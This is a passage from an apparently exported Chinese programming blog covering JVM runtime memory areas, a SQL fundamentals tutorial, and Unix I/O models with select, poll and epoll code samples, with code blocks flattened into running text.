局部变量表所需的内存空间在编译期完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。 如果线程请求的栈深度大于虚拟机所允许的深度，将抛出StackOverflowError异常；如果虚拟机可以动态扩展，扩展时却无法申请到足够的内存，就会抛出OutOfMemoryError异常。 2.3 本地方法栈 本地方法栈与虚拟机栈所发挥的作用是非常相似的，他们之间的区别不过是虚拟机栈尾虚拟机执行java方法(也就是字节码)服务，而本地方法栈则为虚拟机用到的Native方法服务。 Sun HotSpot虚拟机直接将本地方法栈和虚拟机栈合二为一。 与虚拟机栈一样会抛出StackOverflowError异常或者OutOfMemoryError异常。 什么是native方法？ 简单地讲，一个Native Method就是一个java调用非java代码的接口。一个Native Method是这样一个java的方法：该方法的实现由非java语言实现，比如C。这个特征并非java所特有，很多其它的编程语言都有这一机制，比如在C＋＋中，你可以用extern “C”告知C＋＋编译器去调用一个C的函数。 2.4 java堆 java堆一般是java虚拟机所管理的内存中最大的一块。 java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。 堆上存放对象实例和数组。 java堆可以处于物理上不连续的内存空间中，只要逻辑上是连续的即可。 如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError异常。 2.5 方法区 方法区和堆一样，是各个线程共享的内存区域。 它用于存储已被虚拟机加载的类信息、常量、静态变量、及时编译器编译后的代码等数据。 其中，类信息包含类的版本、字段、接口、方法 虽然Java虚拟机规范把方法区描述为堆的一个逻辑部分，但是他有一个别名叫做Non-Heap(非堆)，目的是与堆区分开。 方法区不等同于永久代。 2.6 运行时常量池 是方法区的一部分。 类文件中除了类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池，用于存放编译期生成的各种字面量和符号引用，这部分内容将在类加载后进入方法的运行时常量池中存放。 这里尤其值得注意的是字符串的创建，会被扔到常量池中。如果是new，那么还是在堆重创建的。当然，运行时也可以产生新的常量放入池中，比如讲new出来的字符串用intern()方法便可以在运行时将其放到常量池中。 举例 123456789101112public static void main(String[] args) &#123; String str1 = "hello"; String str2 = "hello"; System.out.println(str1 == str2); //true String str3 = new String("hello"); System.out.println(str1 == str3); //false System.out.println(str1 == str3.intern()); //true &#125; 说明 对于直接声明的内容相同的字符串，对于str2来说是不需要重新分配地址的，因为str1的hello这个常量已经存在于常量池中了。所以他们两个其实是一个东西。 对于new出来的str3，是不会直接扔到常量池中的，他是在堆中分配，地址不一样，所以显然是false。 String类的intern()方法，使得运行时将堆中产生的对象放入常量池中，所以是true。 2.7 直接内存 直接内存并不是虚拟机运行时数据区的一部分，也不是java虚拟机规范中定义的内存区域。可能抛出OutOfMemoryError异常,不怎么关注。 3、对象探秘对象的创建 类加载检查：检查该对象的类是否已经被加载、解析、初始化过，如果没有则先进行类加载操作。 分配内存：如果内存规整使用“指针碰撞”分配，否则一般使用“空闲列表”分配，具体看垃圾回收器是否带有整理（Compact）空闲内存功能。 初始化：将内存区初始化置零，不包含对象头，这一步保证了对象的实例字段在java代码中可以不赋初值就直接使用，程序能访问到这些字段的数据类型所对应的零值。 对象头设置：这个对象是哪个类的实例、如何找到类的元数据信息、哈希码、GC分代年龄信息等即为对象头 对象的方法：即按照程序员的意愿进行初始化 对象的内存布局 对象头一部分称为Mark Word，存储对象自身运行时的数据，包含哈希码、GC分代年龄、锁状态标志等等，采用压缩存储，压缩到虚拟机位数（32位/64位）。由于对象头信息是与对象自身定义的数据无关的额外存储成本，考虑到虚拟机的空间效率，Mark Word被设计为一个非固定的数据结构以便在极小的空间内存储尽量多的信息，它会根据对象的状态复用自己的存储空间。另一部分为类型指针，指向它的类元数据，虚拟机通过这个指针来确定这个对象是哪个类的实例。并不是所有虚拟机实现都必须在对象数据上保留类型指针，换句话说，++查找对象的元数据信息不一定要经过对象本身++。注意 如果对象是一个java数组，那么在对象头中还必须有一块用于记录数组长度的数据，因为虚拟机可以通过普通java对象的元数据信息确定java对象的大小，但是从数组的元数据中却无法确定数组的大小。 实例数据 实例数据部分是对象真正存储的有效信息，也是在程序中定义的各种类型的字段内容。 无论是从父类继承下来的，还是在子类中定义的，都需要记录起来。 从分配策略中可以看出，相同宽度的字段总是分配在一起，在满足这个前提条件的情况下，在父类中定义的变量会出现在子类之前。 对齐填充 非必需，只有前两者加起来非8的倍数时才会有。 因为HotSpot VM 的自动内存管理系统要求对象起始地址必须是8字节的整数倍，也就是说，对象的大小必须是8字节的整数倍。不对齐的时候，需要通过它来填充对齐。 对象的访问定位 通过句柄访问 通过句柄访问对象：当java虚拟机GC移动堆对象时，并不需要修改reference，只需修改句柄对象的实例数据指针。 通过直接指针访问 通过直接指针访问对象：加快了对象访问速度，比间接访问少一次对象实例数据的访问，HotSpot则采用的这种访问方式。]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL必知必会]]></title>
    <url>%2F2018%2F07%2F21%2FSQL%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%2F</url>
    <content type="text"><![CDATA[掌握mysql基础的语法，是作为web开发的基础要求。 一、基础模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。 主键的值不允许修改，也不允许复用（不能使用已经删除的主键值赋给新数据行的主键）。 SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。 SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。 SQL 支持以下三种注释： 12345# 注释SELECT *FROM mytable; -- 注释/* 注释1 注释2 */ 二、创建表123456CREATE TABLE mytable ( id INT NOT NULL AUTO_INCREMENT, col1 INT NOT NULL DEFAULT 1, col2 VARCHAR(45) NULL, col3 DATE NULL, PRIMARY KEY (`id`)); 三、修改表添加列12ALTER TABLE mytableADD col CHAR(20); 删除列12ALTER TABLE mytableDROP COLUMN col; 删除表1DROP TABLE mytable; 四、插入普通插入 12INSERT INTO mytable(col1, col2)VALUES(val1, val2); 插入检索出来的数据 123INSERT INTO mytable1(col1, col2)SELECT col1, col2FROM mytable2; 将一个表的内容插入到一个新表 12CREATE TABLE newtable ASSELECT * FROM mytable; 五、更新123UPDATE mytableSET col = valWHERE id = 1; 六、删除12DELETE FROM mytableWHERE id = 1; TRUNCATE TABLE 可以清空表，也就是删除所有行。 1TRUNCATE TABLE mytable; 使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。 七、查询DISTINCT相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。 12SELECT DISTINCT col1, col2FROM mytable; LIMIT限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。 返回前 5 行： 123SELECT *FROM mytableLIMIT 5; 123SELECT *FROM mytableLIMIT 0, 5; 返回第 3 ~ 5 行： 123SELECT *FROM mytableLIMIT 2, 3; 八、排序 ASC ：升序（默认） DESC ：降序 可以按多个列进行排序，并且为每个列指定不同的排序方式： 123SELECT *FROM mytableORDER BY col1 DESC, col2 ASC; 九、过滤不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。 123SELECT *FROM mytableWHERE col IS NULL; 下表显示了 WHERE 子句可用的操作符 操作符 说明 = 等于 &lt; 小于 &gt; 大于 &lt;&gt; != 不等于 &lt;= !&gt; 小于等于 &gt;= !&lt; 大于等于 BETWEEN 在两个值之间 IS NULL 为 NULL 值 应该注意到，NULL 与 0、空字符串都不同。 AND 和 OR 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。 IN 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。 NOT 操作符用于否定一个条件。 十、通配符通配符也是用在过滤语句中，但它只能用于文本字段。 % 匹配 &gt;=0 个任意字符； _ 匹配 ==1 个任意字符； [ ] 可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。 使用 Like 来进行通配符匹配。 123SELECT *FROM mytableWHERE col LIKE '[^AB]%'; -- 不以 A 和 B 开头的任意文本 不要滥用通配符，通配符位于开头处匹配会非常慢。 十一、计算字段在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。 计算字段通常需要使用 AS 来取别名，否则输出的时候字段名为计算表达式。 12SELECT col1 * col2 AS aliasFROM mytable; CONCAT() 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 TRIM() 可以去除首尾空格。 12SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_colFROM mytable; 十二、函数汇总 函 数 说 明 AVG() 返回某列的平均值 COUNT() 返回某列的行数 MAX() 返回某列的最大值 MIN() 返回某列的最小值 SUM() 返回某列值之和 AVG() 会忽略 NULL 行。 使用 DISTINCT 可以让汇总函数值汇总不同的值。 12SELECT AVG(DISTINCT col1) AS avg_colFROM mytable; 文本处理 函数 说明 LEFT() 左边的字符 RIGHT() 右边的字符 LOWER() 转换为小写字符 UPPER() 转换为大写字符 LTRIM() 去除左边的空格 RTRIM() 去除右边的空格 LENGTH() 长度 SOUNDEX() 转换为语音值 其中， SOUNDEX() 可以将一个字符串转换为描述其语音表示的字母数字模式。 123SELECT *FROM mytableWHERE SOUNDEX(col1) = SOUNDEX('apple') 日期和时间处理 日期格式：YYYY-MM-DD 时间格式：HH:MM:SS 函 数 说 明 AddDate() 增加一个日期（天、周等） AddTime() 增加一个时间（时、分等） CurDate() 返回当前日期 CurTime() 返回当前时间 Date() 返回日期时间的日期部分 DateDiff() 计算两个日期之差 Date_Add() 高度灵活的日期运算函数 Date_Format() 返回一个格式化的日期或时间串 Day() 返回一个日期的天数部分 DayOfWeek() 对于一个日期，返回对应的星期几 Hour() 返回一个时间的小时部分 Minute() 返回一个时间的分钟部分 Month() 返回一个日期的月份部分 Now() 返回当前日期和时间 Second() 返回一个时间的秒部分 Time() 返回一个日期时间的时间部分 Year() 返回一个日期的年份部分 1mysql&gt; SELECT NOW(); 12018-4-14 20:25:11 数值处理 函数 说明 SIN() 正弦 COS() 余弦 TAN() 正切 ABS() 绝对值 SQRT() 平方根 MOD() 余数 EXP() 指数 PI() 圆周率 RAND() 随机数 十三、分组分组就是把具有相同的数据值的行放在同一组中。 可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。 指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。 123SELECT col, COUNT(*) AS numFROM mytableGROUP BY col; GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。 1234SELECT col, COUNT(*) AS numFROM mytableGROUP BY colORDER BY num; WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。 12345SELECT col, COUNT(*) AS numFROM mytableWHERE col &gt; 2GROUP BY colHAVING num &gt;= 2; 分组规定： GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前； 除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出； NULL 的行会单独分为一组； 大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。 十四、子查询子查询中只能返回一个字段的数据。 可以将子查询的结果作为 WHRER 语句的过滤条件： 1234SELECT *FROM mytable1WHERE col1 IN (SELECT col2 FROM mytable2); 下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次： 123456SELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_numFROM CustomersORDER BY cust_name; 十五、连接连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。 连接可以替换子查询，并且比子查询的效率一般会更快。 可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。 内连接内连接又称等值连接，使用 INNER JOIN 关键字。 123SELECT A.value, B.valueFROM tablea AS A INNER JOIN tableb AS BON A.key = B.key; 可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。 123SELECT A.value, B.valueFROM tablea AS A, tableb AS BWHERE A.key = B.key; 在没有条件语句的情况下返回笛卡尔积。 自连接自连接可以看成内连接的一种，只是连接的表是自身而已。 一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。 子查询版本 123456SELECT nameFROM employeeWHERE department = ( SELECT department FROM employee WHERE name = "Jim"); 自连接版本 1234SELECT e1.nameFROM employee AS e1 INNER JOIN employee AS e2ON e1.department = e2.department AND e2.name = "Jim"; 自然连接自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。 内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。 12SELECT A.value, B.valueFROM tablea AS A NATURAL JOIN tableb AS B; 外连接外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。 检索所有顾客的订单信息，包括还没有订单信息的顾客。 123SELECT Customers.cust_id, Orders.order_numFROM Customers LEFT OUTER JOIN OrdersON Customers.cust_id = Orders.cust_id; customers 表： cust_id cust_name 1 a 2 b 3 c orders 表： order_id cust_id 1 1 2 1 3 3 4 3 结果： cust_id cust_name order_id 1 a 1 1 a 2 3 c 3 3 c 4 2 b Null 十六、组合查询使用 UNION 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。 每个查询必须包含相同的列、表达式和聚集函数。 默认会去除相同行，如果需要保留相同行，使用 UNION ALL。 只能包含一个 ORDER BY 子句，并且必须位于语句的最后。 1234567SELECT colFROM mytableWHERE col = 1UNIONSELECT colFROM mytableWHERE col =2; 十七、视图视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。 对视图的操作和对普通表的操作一样。 视图具有如下好处： 简化复杂的 SQL 操作，比如复杂的连接； 只使用实际表的一部分数据； 通过只给用户访问视图的权限，保证数据的安全性； 更改数据格式和表示。 1234CREATE VIEW myview ASSELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_colFROM mytableWHERE col5 = val; 十八、存储过程存储过程可以看成是对一系列 SQL 操作的批处理； 使用存储过程的好处： 代码封装，保证了一定的安全性； 代码复用； 由于是预先编译，因此具有很高的性能。 命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。 包含 in、out 和 inout 三种参数。 给变量赋值都需要用 select into 语句。 每次只能给一个变量赋值，不支持集合的操作。 123456789101112delimiter //create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end //delimiter ; 12call myprocedure(@ret);select @ret; 十九、游标在存储过程中使用游标可以对一个结果集进行移动遍历。 游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。 使用游标的四个步骤： 声明游标，这个过程没有实际检索出数据； 打开游标； 取出数据； 关闭游标； 1234567891011121314151617181920delimiter //create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # 定义了一个 continue handler，当 sqlstate '02000' 这个条件出现时，会执行 set done = 1 declare continue handler for sqlstate '02000' set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; 二十、触发器触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。 触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。 INSERT 触发器包含一个名为 NEW 的虚拟表。 1234CREATE TRIGGER mytrigger AFTER INSERT ON mytableFOR EACH ROW SELECT NEW.col into @result;SELECT @result; -- 获取结果 DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。 UPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改地，而 OLD 是只读的。 MySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。 二十一、事务处理基本术语： 事务（transaction）指一组 SQL 语句； 回退（rollback）指撤销指定 SQL 语句的过程； 提交（commit）指将未存储的 SQL 语句结果写入数据库表； 保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。 不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。 MySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。 通过设置 autocommit 为 0 可以取消自动提交，直到 autocommit 被设置为 1 才会提交；autocommit 标记是针对每个连接而不是针对服务器的。 如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。 1234567START TRANSACTION// ...SAVEPOINT delete1// ...ROLLBACK TO delete1// ...COMMIT 二十二、字符集基本术语： 字符集为字母和符号的集合； 编码为某个字符集成员的内部表示； 校对字符指定如何比较，主要用于排序和分组。 除了给表指定字符集和校对外，也可以给列指定： 123CREATE TABLE mytable(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; 可以在排序、分组时指定校对： 123SELECT *FROM mytableORDER BY col COLLATE latin1_general_ci; 二十三、权限管理MySQL 的账户信息保存在 mysql 这个数据库中。 12USE mysql;SELECT user FROM user; 创建账户 1CREATE USER myuser IDENTIFIED BY 'mypassword'; 新创建的账户没有任何权限。 修改账户名 1RENAME myuser TO newuser; 删除账户 1DROP USER myuser; 查看权限 1SHOW GRANTS FOR myuser; 授予权限 1GRANT SELECT, INSERT ON mydatabase.* TO myuser; 账户用 username@host 的形式定义，username@% 使用的是默认主机名。 删除权限 1REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; GRANT 和 REVOKE 可在几个层次上控制访问权限： 整个服务器，使用 GRANT ALL 和 REVOKE ALL； 整个数据库，使用 ON database.\*； 特定的表，使用 ON database.table； 特定的列； 特定的存储过程。 更改密码 必须使用 Password() 函数 1SET PASSWROD FOR myuser = Password('new_password'); 转自： SQL]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket基础]]></title>
    <url>%2F2018%2F07%2F21%2FSocket%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[学习I/O几种常见模型以及select、poll、epoll三个关键字。 一、I/O 复用I/O 模型一个输入操作通常包括两个阶段： 等待数据准备好 从内核向进程复制数据 对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待分组到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。 Unix 下有五种 I/O 模型： 阻塞式 I/O 非阻塞式 I/O I/O 复用（select 和 poll） 信号驱动式 I/O（SIGIO） 异步 I/O（AIO） 1. 阻塞式 I/O应用进程被阻塞，直到数据复制到应用进程缓冲区中才返回。 应该注意到，在阻塞的过程中，其它程序还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其他程序还可以执行，因此不消耗 CPU 时间，这种模型的执行效率会比较高。 下图中，recvfrom 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。 1ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); 2. 非阻塞式 I/O应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式成为轮询（polling）。 由于 CPU 要处理更多的系统调用，因此这种模型是比较低效的。 3. I/O 复用使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读，这一过程会被阻塞，当某一个套接字可读时返回。之后再使用 recvfrom 把数据从内核复制到进程中。 它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。 如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。并且相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。 4. 信号驱动 I/O应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。 相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。 5. 异步 I/O进行 aio_read 系统调用会立即返回，应用进程继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。 异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。 6. 同步 I/O 与异步 I/O 同步 I/O：应用进程在调用 recvfrom 操作时会阻塞。 异步 I/O：不会阻塞。 阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O 都是同步 I/O，虽然非阻塞式 I/O 和信号驱动 I/O 在等待数据阶段不会阻塞，但是在之后的将数据从内核复制到应用进程这个操作会阻塞。 7. 五大 I/O 模型比较前四种 I/O 模型的主要区别在于第一个阶段，而第二个阶段是一样的：将数据从内核复制到应用进程过程中，应用进程会被阻塞。 select/poll/epoll这三个都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。 1. select1int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); fd_set 表示描述符集合类型，有三个参数：readset、writeset 和 exceptset，分别对应读、写、异常条件的描述符集合。 timeout 参数告知内核等待所指定描述符中的任何一个就绪可花多少时间； 成功调用返回结果大于 0；出错返回结果为 -1；超时返回结果为 0。 每次调用 select 都需要将 fd_set \*readfds, fd_set \*writefds, fd_set \*exceptfds 链表内容全部从应用进程缓冲复制到内核缓冲。 返回结果中内核并没有声明 fd_set 中哪些描述符已经准备好，所以如果返回值大于 0 时，应用进程需要遍历所有的 fd_set。 select 最多支持 1024 个描述符，其中 1024 由内核的 FD_SETSIZE 决定。如果需要打破该限制可以修改 FD_SETSIZE，然后重新编译内核。 123456789101112131415161718192021222324252627282930313233343536fd_set fd_in, fd_out;struct timeval tv;// Reset the setsFD_ZERO( &amp;fd_in );FD_ZERO( &amp;fd_out );// Monitor sock1 for input eventsFD_SET( sock1, &amp;fd_in );// Monitor sock2 for output eventsFD_SET( sock2, &amp;fd_out );// Find out which socket has the largest numeric value as select requires itint largest_sock = sock1 &gt; sock2 ? sock1 : sock2;// Wait up to 10 secondstv.tv_sec = 10;tv.tv_usec = 0;// Call the selectint ret = select( largest_sock + 1, &amp;fd_in, &amp;fd_out, NULL, &amp;tv );// Check if select actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; if ( FD_ISSET( sock1, &amp;fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, &amp;fd_out ) ) // output event on sock2&#125; 2. poll1int poll(struct pollfd *fds, unsigned int nfds, int timeout); 12345struct pollfd &#123; int fd; //文件描述符 short events; //监视的请求事件 short revents; //已发生的事件&#125;; 它和 select 功能基本相同。同样需要每次将描述符从应用进程复制到内核，poll 调用返回后同样需要进行轮询才能知道哪些描述符已经准备好。 poll 取消了 1024 个描述符数量上限，但是数量太大以后不能保证执行效率，因为复制大量内存到内核十分低效，所需时间与描述符数量成正比。 poll 在描述符的重复利用上比 select 的 fd_set 会更好。 如果在多线程下，如果一个线程对某个描述符调用了 poll 系统调用，但是另一个线程关闭了该描述符，会导致 poll 调用结果不确定，该问题同样出现在 select 中。 1234567891011121314151617181920212223242526272829// The structure for two eventsstruct pollfd fds[2];// Monitor sock1 for inputfds[0].fd = sock1;fds[0].events = POLLIN;// Monitor sock2 for outputfds[1].fd = sock2;fds[1].events = POLLOUT;// Wait 10 secondsint ret = poll( &amp;fds, 2, 10000 );// Check if poll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // If we detect the event, zero it out so we can reuse the structure if ( pfd[0].revents &amp; POLLIN ) pfd[0].revents = 0; // input event on sock1 if ( pfd[1].revents &amp; POLLOUT ) pfd[1].revents = 0; // output event on sock2&#125; 3. epoll123int epoll_create(int size);int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epoll 仅仅适用于 Linux OS。 它是 select 和 poll 的增强版，更加灵活而且没有描述符数量限制。 它将用户关心的描述符放到内核的一个事件表中，从而只需要在用户空间和内核空间拷贝一次。 select 和 poll 方式中，进程只有在调用一定的方法后，内核才对所有监视的描述符进行扫描。而 epoll 事先通过 epoll_ctl() 来注册描述符，一旦基于某个描述符就绪时，内核会采用类似 callback 的回调机制，迅速激活这个描述符，当进程调用 epoll_wait() 时便得到通知。 新版本的 epoll_create(int size) 参数 size 不起任何作用，在旧版本的 epoll 中如果描述符的数量大于 size，不保证服务质量。 epoll_ctl() 执行一次系统调用，用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理。 epoll_wait() 取出在内核中通过链表维护的 I/O 准备好的描述符，将他们从内核复制到应用进程中，不需要像 select/poll 对注册的所有描述符遍历一遍。 epoll 对多线程编程更有友好，同时多个线程对同一个描述符调用了 epoll_wait() 也不会产生像 select/poll 的不确定情况。或者一个线程调用了 epoll_wait 另一个线程关闭了同一个描述符也不会产生不确定情况。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.// The function argument is ignored (it was not before, but now it is), so put your favorite number hereint pollingfd = epoll_create( 0xCAFE );if ( pollingfd &lt; 0 ) // report error// Initialize the epoll structure in case more members are added in futurestruct epoll_event ev = &#123; 0 &#125;;// Associate the connection class instance with the event. You can associate anything// you want, epoll does not use this information. We store a connection class pointer, pConnection1ev.data.ptr = pConnection1;// Monitor for input, and do not automatically rearm the descriptor after the eventev.events = EPOLLIN | EPOLLONESHOT;// Add the descriptor into the monitoring list. We can do it even if another thread is// waiting in epoll_wait - the descriptor will be properly addedif ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != 0 ) // report error// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)struct epoll_event pevents[ 20 ];// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event arrayint ready = epoll_wait( pollingfd, pevents, 20, 10000 );// Check if epoll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // Check if any events detected for ( int i = 0; i &lt; ret; i++ ) &#123; if ( pevents[i].events &amp; EPOLLIN ) &#123; // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c-&gt;handleReadEvent(); &#125; &#125;&#125; select 和 poll 比较1. 功能它们提供了几乎相同的功能，但是在一些细节上有所不同： select 会修改 fd_set 参数，而 poll 不会； select 默认只能监听 1024 个描述符，如果要监听更多的话，需要修改 FD_SETSIZE 之后重新编译； poll 提供了更多的事件类型。 2. 速度poll 和 select 在速度上都很慢。 它们都采取轮询的方式来找到 I/O 完成的描述符，如果描述符很多，那么速度就会很慢； select 只使用每个描述符的 3 位，而 poll 通常需要使用 64 位，因此 poll 需要复制更多的内核空间。 3. 可移植性几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。 eopll 工作模式epoll_event 有两种触发模式：LT（level trigger）和 ET（edge trigger）。 1. LT 模式当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用 epoll_wait() 时，会再次响应应用程序并通知此事件。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。 2. ET 模式当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用 epoll_wait() 时，不会再次响应应用程序并通知此事件。很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。 select poll epoll 应用场景很容易产生一种错觉认为只要用 epoll 就可以了，select poll 都是历史遗留问题，并没有什么应用场景，其实并不是这样的。 1. select 应用场景select() poll() epoll_wait() 都有一个 timeout参数，在 select() 中 timeout 的精确度为 1ns，而 poll() 和 epoll_wait() 中则为 1ms。所以 select 更加适用于实时要求更高的场景，比如核反应堆的控制。 select 历史更加悠久，它的可移植性更好，几乎被所有主流平台所支持。 2. poll 应用场景poll 没有最大描述符数量的限制，如果平台支持应该采用 poll 且对实时性要求并不是十分严格，而不是 select。 需要同时监控小于 1000 个描述符。那么也没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。 需要监控的描述符状态变化多，而且都是非常短暂的。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。epoll 的描述符存储在内核，不容易调试。 3. epoll 应用场景程序只需要运行在 Linux 平台上，有非常大量的描述符需要同时轮询，而且这些连接最好是长连接。 对比举例说明：老师收学生作业，相当于应用层调用I/O操作。 1、老师逐个收学生作业，学生没有做完，只能阻塞等待，收了之后，再去收下一个学生的作业。这显然存在性能问题。 